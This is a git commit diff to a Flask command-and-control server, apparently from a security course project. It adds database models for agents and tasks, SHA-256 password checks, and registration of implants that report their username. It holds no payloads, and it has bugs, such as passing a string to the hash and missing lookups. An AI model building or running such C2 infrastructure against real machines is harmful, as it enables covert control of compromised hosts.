d356925ab6d31feda59e103a0d8e5addf4348d32
YuhaoT <heyuhao97@gamil.com>
2022-04-11 19:24:33 -0400

    hash password; store the hex_hash value in db; verified password based on that

--- C2/c2_server.py
+++ C2/c2_server.py
@@ -1,5 +1,6 @@
 from flask import Flask , request, jsonify
 from flask_sqlalchemy import SQLAlchemy
+import hashlib;
 
 app = Flask(__name__) # use this to generate routes and handlers
 
@@ -17,12 +18,41 @@ db = SQLAlchemy(app)
 
 password = "ch0nky" # a temperary password to test the server
 
-def verify_password(reg_password):
+# code snippets from lecture13
+
+CREATED = "CREATED"
+TASKED = 'TASKED'
+DONE = "DONE"
+class Task(db.Model):
+    id= db.Column(db.Integer, primary_key=True)
+    job_id = db.Column(db.String)
+    command_type = db.Column(db.String)
+    cmd = db.Column(db.String)
+    Status = db.Column(db.String)
+    agent_id = db.Column(db.String)
+
+class Agent(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    agent_id = db.Column(db.String)
+    username = db.Column(db.String)
+    password = db.Column(db.String)
+
+# search agent by agent_id
+# link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
+def find_agent_by_id(id_):
+    return Agent.query.filter_by(agent_id=id_).first()
+
+
+def verify_password(reg_agent_id, reg_password):
     """
         a function that verifies the password
         TODO: need a safer way to verify the password in the actual implementation
     """
-    return reg_password == password
+    h = hashlib.sha256()
+    h.update(reg_password)
+    hex_password = h.hexdigest()
+    agent = find_agent_by_id(reg_agent_id)
+    return agent.password == hex_password
 
 # the following is a route
 # think of this as a subpage
@@ -34,20 +64,24 @@ def register_agent(): # --> this is a handler
         and processes the registration request from agents
     """
     # request.json -> this will be how we are getting data from implant
-
     reg_data = request.json # storing registration data
     reg_password = reg_data["password"]
     reg_whoami = reg_data["whoami"]
     reg_agent_id = reg_data["agent_id"]
 
-    if verify_password(reg_password):
+    if verify_password(reg_agent_id, reg_password):
         print("[+] a new agent has successfully registered")
         print(f"[+] agent_id: {reg_agent_id}")
-        return jsonify({"status": "ok"})
     else:
         # print("[-] authentication failed")
         return jsonify({"status": "authentication failed"})
-    return "[-] something went wrong"
+
+    agent = Agent(agent_id = reg_agent_id, username = reg_whoami)
+    db.session.add(agent)
+    print(f"[+] A new agent {agent.id} has connected to our server! {agent.agent_id}, {agent.username}")
+    db.session.commit()
+
+    return jsonify({"status": "ok", "message": "Welcome!"})
 
 if __name__ == '__main__':
     app.run()
--- README.md
+++ README.md
@@ -4,7 +4,7 @@
 
     - Contains all the files related to the server side of the project
     - A virtual environment is available in the folder
-        - Use `source c2_env/bin/activate` to activate the virtual environment
+        - Use `source c2_venv/bin/activate` to activate the virtual environment
         - to install new packages use pip3
         - run python files with python3
         - start running the server with `python3 c2_server.py` (apparently there is NO need to export and the set flask_env=development for now)
